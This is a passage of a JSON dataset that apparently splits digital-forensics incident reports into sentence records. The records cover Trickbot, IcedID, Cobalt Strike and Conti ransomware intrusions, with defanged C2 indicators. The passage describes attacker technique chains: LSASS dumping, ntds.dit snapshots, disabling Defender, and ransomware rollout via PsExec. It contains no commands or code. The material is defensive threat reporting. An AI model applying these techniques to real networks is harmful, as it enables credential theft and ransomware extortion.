    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S49",
        "text": "The obfuscated/encrypted shellcode is then sent into a Cobalt Strike named pipe.",
        "type": "",
        "report": "r-dfir-25",
        "line": 49,
        "index": 6256
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S50",
        "text": "In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike.",
        "type": "",
        "report": "r-dfir-25",
        "line": 50,
        "index": 6257
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S51",
        "text": "Pipes being created with the name MSSE-*-server are a great indicator to hunt for.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 51,
        "index": 6258
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S52",
        "text": "From here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 52,
        "index": 6259
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S53",
        "text": "In the raw shellcode we can find the URI and the User-Agent:\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 53,
        "index": 6260
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S54",
        "text": "The HTTPS beacon spawned by filepass.exe continues to check in every ~5 seconds.",
        "type": "",
        "report": "r-dfir-25",
        "line": 54,
        "index": 6261
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S55",
        "text": "The initial Trickbot traffic can be seen in blue, followed by the Cobalt Strike traffic in red: https://tria.ge/210617-6hxwajevbs\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 55,
        "index": 6262
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S56",
        "text": "Example request:",
        "type": "",
        "report": "r-dfir-25",
        "line": 56,
        "index": 6263
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S0",
        "text": "In this intrusion, we observed a number of interesting techniques being leveraged by the threat actors.",
        "type": "",
        "report": "r-dfir-26",
        "line": 0,
        "index": 6264
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S1",
        "text": "The threat actors were able to go from initial access to the deployment of Conti ransomware in a matter of hours.",
        "type": "",
        "report": "r-dfir-26",
        "line": 1,
        "index": 6265
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S2",
        "text": "The Conti operators chose to wait a couple days before ransoming the environment.",
        "type": "",
        "report": "r-dfir-26",
        "line": 2,
        "index": 6266
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S3",
        "text": "Even though most of the techniques aren\u2019t new or advanced, they have proven to be effective.",
        "type": "",
        "report": "r-dfir-26",
        "line": 3,
        "index": 6267
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S4",
        "text": "We have observed the same techniques in other intrusions and understanding these techniques will allow defenders to disrupt such intrusion activity and deny it in their own networks.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 4,
        "index": 6268
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S5",
        "text": "The Trickbot payload came from a phishing campaign associated with BazarCall, delivering weaponized XLSB files.",
        "type": "",
        "report": "r-dfir-26",
        "line": 5,
        "index": 6269
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S6",
        "text": "Upon execution, certutil.exe was copied to %programdata% and renamed with random alphanumeric characters.",
        "type": "",
        "report": "r-dfir-26",
        "line": 6,
        "index": 6270
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S7",
        "text": "Certutil was used to download and load the Trickbot DLL into memory.",
        "type": "",
        "report": "r-dfir-26",
        "line": 7,
        "index": 6271
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S8",
        "text": "Trickbot was automatically tasked to inject into the wermgr.exe process and use its well-known \u201cpwgrab\u201d module to steal browser credentials.",
        "type": "",
        "report": "r-dfir-26",
        "line": 8,
        "index": 6272
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S9",
        "text": "As part of further automated tasking, Trickbot performed an initial reconnaissance of the environment using native Windows tools such as nltest.exe and net.exe.",
        "type": "",
        "report": "r-dfir-26",
        "line": 9,
        "index": 6273
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S10",
        "text": "First hands-on activity was observed two hours after initial compromise, when Trickbot downloaded and executed Cobalt Strike Beacons.",
        "type": "",
        "report": "r-dfir-26",
        "line": 10,
        "index": 6274
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S11",
        "text": "To guarantee execution on the beachhead host, multiple payloads were used.",
        "type": "",
        "report": "r-dfir-26",
        "line": 11,
        "index": 6275
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S12",
        "text": "One of the Cobalt Strike Beacons was the same payload and command and control infrastructure as used in a prior case.",
        "type": "",
        "report": "r-dfir-26",
        "line": 12,
        "index": 6276
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S13",
        "text": "The initial access method for that case was IcedID, which shows that the threat actors utilize various initial access methods to get into environments and accomplish their goals.",
        "type": "",
        "report": "r-dfir-26",
        "line": 13,
        "index": 6277
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S14",
        "text": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
        "type": "",
        "report": "r-dfir-26",
        "line": 14,
        "index": 6278
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S15",
        "text": "Presence was then expanded on the beachhead by using a PowerShell loader to execute additional Beacons.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 15,
        "index": 6279
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S16",
        "text": "We observed the threat actors having technical issues.",
        "type": "",
        "report": "r-dfir-26",
        "line": 16,
        "index": 6280
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S17",
        "text": "One example being with a Beacon unsuccessfully injecting into a process.",
        "type": "",
        "report": "r-dfir-26",
        "line": 17,
        "index": 6281
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S18",
        "text": "It is unclear if this was an untrained actor, or there was a configuration issue.",
        "type": "",
        "report": "r-dfir-26",
        "line": 18,
        "index": 6282
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S19",
        "text": "Fifteen minutes after domain enumeration, we observed successful lateral movement to two endpoints on the network.",
        "type": "",
        "report": "r-dfir-26",
        "line": 19,
        "index": 6283
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S20",
        "text": "Ten minutes after lateral movement, a PowerShell Cobalt Strike loader executed as a service on a server.",
        "type": "",
        "report": "r-dfir-26",
        "line": 20,
        "index": 6284
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S21",
        "text": "Even though the execution was not successful, the threat actors kept trying, a total of eight times, until it finally worked.",
        "type": "",
        "report": "r-dfir-26",
        "line": 21,
        "index": 6285
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S22",
        "text": "Windows Defender real-time monitoring was then disabled, the LSASS.exe process was dumped using SysInternals ProcDump, and privilege was escalated to \u201cSYSTEM\u201d using named pipe impersonation.",
        "type": "",
        "report": "r-dfir-26",
        "line": 22,
        "index": 6286
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S23",
        "text": "Almost four hours after initial execution, the threat actors pivoted to a domain controller using domain admin credentials and executed a Cobalt Strike Beacon.",
        "type": "",
        "report": "r-dfir-26",
        "line": 23,
        "index": 6287
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S24",
        "text": "Once they had domain controller access, ntdsutil was used to take a snapshot of \u201cntds.dit\u201d, saved under \u201cC:\\Perflogs\\1\u201d, for offline password hash extraction.",
        "type": "",
        "report": "r-dfir-26",
        "line": 24,
        "index": 6288
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S25",
        "text": "This is a technique that we don\u2019t see very often, but effective nevertheless.",
        "type": "",
        "report": "r-dfir-26",
        "line": 25,
        "index": 6289
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S26",
        "text": "The threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound.",
        "type": "",
        "report": "r-dfir-26",
        "line": 26,
        "index": 6290
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S27",
        "text": "This was the last observed hands-on-keyboard activity for awhile.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 27,
        "index": 6291
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S28",
        "text": "Two days later, the Cobalt Strike Beacon on the domain controller was once again actively engaged by the threat actors.",
        "type": "",
        "report": "r-dfir-26",
        "line": 28,
        "index": 6292
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S29",
        "text": "Psexec, with two separate batch files, were used to execute Conti ransomware on all domain-joined Windows hosts.",
        "type": "",
        "report": "r-dfir-26",
        "line": 29,
        "index": 6293
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S30",
        "text": "This final deployment was executed around 6:45 UTC on a Monday morning.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 30,
        "index": 6294
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S31",
        "text": "From the point the threat actors returned, to ransom deployment, it was less than 30 minutes.",
        "type": "",
        "report": "r-dfir-26",
        "line": 31,
        "index": 6295
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S32",
        "text": "This would give defenders little time to act if they had not identified and contained the activity from the first day of the Trickbot infection.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 32,
        "index": 6296
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S33",
        "text": "The initial access was achieved as a result of the user opening what appeared to be a benign workbook, a lure, requiring little user interaction.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 33,
        "index": 6297
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S34",
        "text": "The workbook contained hidden and password protected worksheets, these were malicious.",
        "type": "",
        "report": "r-dfir-26",
        "line": 34,
        "index": 6298
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S35",
        "text": "Module functions also indicated code designed to obfuscate and hide true values and functions.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 35,
        "index": 6299
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S36",
        "text": "This document and the following DLL were noted as being associated to a BazarCall campaign by @ffforward.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 36,
        "index": 6300
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S37",
        "text": "From the xlsb document, the following execution chain occurs.",
        "type": "",
        "report": "r-dfir-26",
        "line": 37,
        "index": 6301
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S38",
        "text": "Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.",
        "type": "",
        "report": "r-dfir-26",
        "line": 38,
        "index": 6302
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S39",
        "text": "We observed a second stage execution using regsvr32 to load a DLL from the user\u2019s AppData\\Local\\Temp folder.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 39,
        "index": 6303
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S40",
        "text": "Almost immediately an outbound IPv4 address lookup was requested via HTTP.",
        "type": "",
        "report": "r-dfir-26",
        "line": 40,
        "index": 6304
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S41",
        "text": "This is usually undertaken to identify the compromised environment, and to facilitate C2.",
        "type": "",
        "report": "r-dfir-26",
        "line": 41,
        "index": 6305
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S42",
        "text": "The user agent refers to Curl \u2013 and used again for another stage of the intrusion.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 42,
        "index": 6306
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S43",
        "text": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \u201cwermgr.exe\u201d.",
        "type": "",
        "report": "r-dfir-26",
        "line": 43,
        "index": 6307
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S44",
        "text": "The executables were identified as Cobalt Strike and communicated over port 443 to C2 88.80.147[.]101.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 44,
        "index": 6308
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S45",
        "text": "A PowerShell download cradle was then used to execute Cobalt Strike Beacon in memory:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 45,
        "index": 6309
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S46",
        "text": "Named pipe impersonation was used to escalate to SYSTEM privileges \u2013 a common Cobalt Strike capability:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 46,
        "index": 6310
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S47",
        "text": "We observed several attempts by the threat actor trying to escalate to SYSTEM \u2013 ultimately succeeding, as evident in several new services running under the Local SYSTEM context:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 47,
        "index": 6311
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S48",
        "text": "Service creation events System Event ID 7045, coupled with unusual commands and service names are a strong indication of privilege escalation activity.",
        "type": "",
        "report": "r-dfir-26",
        "line": 48,
        "index": 6312
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S49",
        "text": "RedCanary provided useful background on GetSystem capabilities of offensive security tools and methods of detection.",
        "type": "",
        "report": "r-dfir-26",
        "line": 49,
        "index": 6313
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S50",
        "text": "Trickbot made extensive use of process injection to hide in benign operating system processes.",
        "type": "",
        "report": "r-dfir-26",
        "line": 50,
        "index": 6314
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S51",
        "text": "It first injected into wermgr.exe and then later into svchost.exe.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 51,
        "index": 6315
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S52",
        "text": "Another defense evasion technique employed by Cobalt Strike, was to disable Windows Defender.",
        "type": "",
        "report": "r-dfir-26",
        "line": 52,
        "index": 6316
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S53",
        "text": "WMIC was used to remotely execute \u2018def.bat\u2019.",
        "type": "",
        "report": "r-dfir-26",
        "line": 53,
        "index": 6317
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S54",
        "text": "The contents of \u2018def.bat\u2019:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 54,
        "index": 6318
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S55",
        "text": "Trickbot made use of esentutl to gather MSEdge history, webcache, and saved passwords using TrickBot\u2019s \u201cpwgrab\u201d module.",
        "type": "",
        "report": "r-dfir-26",
        "line": 55,
        "index": 6319
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S56",
        "text": "LSASS was dumped remotely using ProcDump.",
        "type": "",
        "report": "r-dfir-26",
        "line": 56,
        "index": 6320
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S57",
        "text": "The execution took place from the beachhead using WMIC.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 57,
        "index": 6321
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S58",
        "text": "\u201cNtdsutil\u201d was used to take a snapshot of ntds.dit and save it under \u201cC:\\Perflogs\\1\u201d.",
        "type": "",
        "report": "r-dfir-26",
        "line": 58,
        "index": 6322
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S59",
        "text": "This technique is useful for offline password hash extraction.",
        "type": "",
        "report": "r-dfir-26",
        "line": 59,
        "index": 6323
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S60",
        "text": "This activity occurred twice.",
        "type": "",
        "report": "r-dfir-26",
        "line": 60,
        "index": 6324
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S61",
        "text": "The same batch file, \u201812.bat\u2019, was first executed in the context of SYSTEM; and secondly, in the context of a domain admin user.",
        "type": "",
        "report": "r-dfir-26",
        "line": 61,
        "index": 6325
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S62",
        "text": "The contents of \u201812.bat\u2019:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 62,
        "index": 6326
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S63",
        "text": "Net and Nltest commands were used to gather network and domain reconnaissance.",
        "type": "",
        "report": "r-dfir-26",
        "line": 63,
        "index": 6327
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S64",
        "text": "During the intrusion, this activity was seen multiple times, on multiple hosts.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 64,
        "index": 6328
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S65",
        "text": "Other discovery commands included:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 65,
        "index": 6329
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S66",
        "text": "AdFind.exe and adf.bat were uploaded to the beachhead.",
        "type": "",
        "report": "r-dfir-26",
        "line": 66,
        "index": 6330
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S67",
        "text": "adf.bat was used to execute:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 67,
        "index": 6331
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S68",
        "text": "AdFind results were written to the following locations:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 68,
        "index": 6332
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S69",
        "text": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "type": "",
        "report": "r-dfir-26",
        "line": 69,
        "index": 6333
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S70",
        "text": "The results were saved in:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 70,
        "index": 6334
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S71",
        "text": "BloodHound was later executed on the domain controller as well.",
        "type": "",
        "report": "r-dfir-26",
        "line": 71,
        "index": 6335
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S72",
        "text": "Once again the results were stored in:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 72,
        "index": 6336
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S73",
        "text": "PowerSploit was loaded into memory on the DC and the following functions were used:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 73,
        "index": 6337
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S74",
        "text": "An encoded PowerShell command was executed on the domain controller to enumerate all AD joined hosts and save the results to:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 74,
        "index": 6338
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S75",
        "text": "The decoded PowerShell command:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 75,
        "index": 6339
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S76",
        "text": "From the beachhead, WMIC was used to remotely execute \u2018165.bat\u2019 on two other hosts.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 76,
        "index": 6340
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S77",
        "text": "Multiple failed attempts were observed prior to the successful execution of a PowerShell Cobalt Strike loader via a service with \u201cSYSTEM\u201d privileges.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 77,
        "index": 6341
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S78",
        "text": "Decoded Cobalt Strike shellcode, using Cyber Chef recipe: https://github.com/mattnotmax/cyberchef-recipes#recipe-28\u2014de-obfuscation-of-cobalt-strike-beacon-using-conditional-jumps-to-obtain-shellcode\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 78,
        "index": 6342
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S79",
        "text": "Multiple C2 channels were established, some were persistent whilst others appeared to be single purpose \u2013 used for payload retrieval or fallback C2.",
        "type": "",
        "report": "r-dfir-26",
        "line": 79,
        "index": 6343
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S80",
        "text": "Persistent C2 activity was Cobalt Strike.",
        "type": "",
        "report": "r-dfir-26",
        "line": 80,
        "index": 6344
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S81",
        "text": "The beachhead had multiple C2 channels, two of which were unique.",
        "type": "",
        "report": "r-dfir-26",
        "line": 81,
        "index": 6345
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S82",
        "text": "We assess that the threat actors were ensuring a loss of a single source C2 wouldn\u2019t result in losing all C2 to the compromised environment.",
        "type": "",
        "report": "r-dfir-26",
        "line": 82,
        "index": 6346
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S83",
        "text": "We observed a payload being retrieved from a unique IPv4 address.",
        "type": "",
        "report": "r-dfir-26",
        "line": 83,
        "index": 6347
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S84",
        "text": "An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 84,
        "index": 6348
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S85",
        "text": "Using the Curl 7.74.0 user agent:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 85,
        "index": 6349
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S86",
        "text": "Analysis of this binary, shows C2 activity to the following:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 86,
        "index": 6350
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S87",
        "text": "The binary has an unusual PDB string that indicates obfuscation:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 87,
        "index": 6351
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S88",
        "text": "The two persistent C2 channels were analyzed to determine the Cobalt Strike configuration.",
        "type": "",
        "report": "r-dfir-26",
        "line": 88,
        "index": 6352
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S89",
        "text": "Each C2 channel was configured as follows:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 89,
        "index": 6353
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S90",
        "text": "As part of the discovery stage, we observed data being exfiltrated.",
        "type": "",
        "report": "r-dfir-26",
        "line": 90,
        "index": 6354
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S91",
        "text": "The data ranged from host discovery, running processes, and user accounts:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 91,
        "index": 6355
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S92",
        "text": "Entire AD forest data \u2013 including usernames , DC configuration, and machine enumeration:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 92,
        "index": 6356
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S93",
        "text": "When, the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 93,
        "index": 6357
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S94",
        "text": "Two batch scripts were executed on the domain controller to automate ransomware deployment via PSExec.",
        "type": "",
        "report": "r-dfir-26",
        "line": 94,
        "index": 6358
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S95",
        "text": "The first was \u201c_COPY.bat\u201d, to stage the CONTI ransomware payload on all domain-joined computers.",
        "type": "",
        "report": "r-dfir-26",
        "line": 95,
        "index": 6359
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S96",
        "text": "The second was \u201c_EXE.bat\u201d, to execute the staged CONTI payloads.",
        "type": "",
        "report": "r-dfir-26",
        "line": 96,
        "index": 6360
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S97",
        "text": "The batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 97,
        "index": 6361
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S98",
        "text": "Files were then encrypted with the following extension [KCRAO]:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 98,
        "index": 6362
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S99",
        "text": "A readme.txt file was created in each folder:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 99,
        "index": 6363
    },
    {
        "id": "dfir-reports-filtered/r-dfir-26.md:::S100",
        "text": "The content of readme.txt:\n",
        "type": "",
        "report": "r-dfir-26",
        "line": 100,
        "index": 6364
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S0",
        "text": "This intrusion once again highlights common tools in-use today for Initial Access and Post-Exploitation.",
        "type": "",
        "report": "r-dfir-27",
        "line": 0,
        "index": 6365
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S1",
        "text": "Our intrusion starts when a malicious Word document is executed that drops and executes an HTA file.",
        "type": "",
        "report": "r-dfir-27",
        "line": 1,
        "index": 6366
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S2",
        "text": "This HTA file is used to download IcedID in the form of a JPG file.",
        "type": "",
        "report": "r-dfir-27",
        "line": 2,
        "index": 6367
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S3",
        "text": "This file is actually a Windows DLL file, which is executed via regsvr32 (1st stage IcedID).\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 3,
        "index": 6368
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S4",
        "text": "IcedID downloads some 2nd stage payloads and loads the DLL into memory with rundll32 (miubeptk2.dll \u2013 IcedID \u2013 used for persistence) and regsvr32 (ekix4.dll \u2013 Cobalt Strike beacon \u2013 privilege escalation via fodhelper) to pillage the domain.",
        "type": "",
        "report": "r-dfir-27",
        "line": 4,
        "index": 6369
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S5",
        "text": "Service Execution (T1569.002) via Cobalt Strike Beacon was used throughout the intrusion for privilege escalation.",
        "type": "",
        "report": "r-dfir-27",
        "line": 5,
        "index": 6370
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S6",
        "text": "WMIC was utilized to launch ProcDump in an attempt to dump lsass.exe.",
        "type": "",
        "report": "r-dfir-27",
        "line": 6,
        "index": 6371
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S7",
        "text": "WMIC was also used to perform discovery of endpoint security software.",
        "type": "",
        "report": "r-dfir-27",
        "line": 7,
        "index": 6372
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S8",
        "text": "A flurry of other programs were used to perform discovery within the environment including nltest.exe, adfind.exe via adf.bat, and net.exe.",
        "type": "",
        "report": "r-dfir-27",
        "line": 8,
        "index": 6373
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S9",
        "text": "Command and Control was achieved via IcedID and Cobalt Strike.",
        "type": "",
        "report": "r-dfir-27",
        "line": 9,
        "index": 6374
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S10",
        "text": "There were numerous attempts at lateral movement via Cobalt Strike beacons, with limited success.",
        "type": "",
        "report": "r-dfir-27",
        "line": 10,
        "index": 6375
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S11",
        "text": "Ultimately, the threat actors were unsuccessful when AV snagged their attempts to move to certain servers.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 11,
        "index": 6376
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S12",
        "text": "Particular to this case, we saw an eleven day gap in activity.",
        "type": "",
        "report": "r-dfir-27",
        "line": 12,
        "index": 6377
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S13",
        "text": "While command and control never left, activity\u2013other than beaconing, ceased.",
        "type": "",
        "report": "r-dfir-27",
        "line": 13,
        "index": 6378
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S14",
        "text": "On day eleven, a new Cobalt Strike infrastructure was introduced to the environment with the threat actor displaying new techniques that were successful in moving laterally, where the initial activity failed.",
        "type": "",
        "report": "r-dfir-27",
        "line": 14,
        "index": 6379
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S15",
        "text": "This may indicate a hand off to a new group, or the original actor may have returned, either way, we did not see a final action on objectives.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 15,
        "index": 6380
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S16",
        "text": "Initial access for this intrusion was via a malicious attachment \u201corder 06.21.doc\u201d.",
        "type": "",
        "report": "r-dfir-27",
        "line": 16,
        "index": 6381
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S17",
        "text": "The attachment was a Microsoft Word document that drops a malicious HTA file \u201ctextboxNameNamespace.hta\u201d.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 17,
        "index": 6382
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S18",
        "text": "Analysis of the encoded HTA file revealed that a file named textboxNameNamespace.jpg was downloaded from http://povertyboring2020b[.]com.",
        "type": "",
        "report": "r-dfir-27",
        "line": 18,
        "index": 6383
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S19",
        "text": "This file\u2019s extension is misleading as the file is a Windows DLL.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 19,
        "index": 6384
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S20",
        "text": "The HTA file is written to:\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 20,
        "index": 6385
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S21",
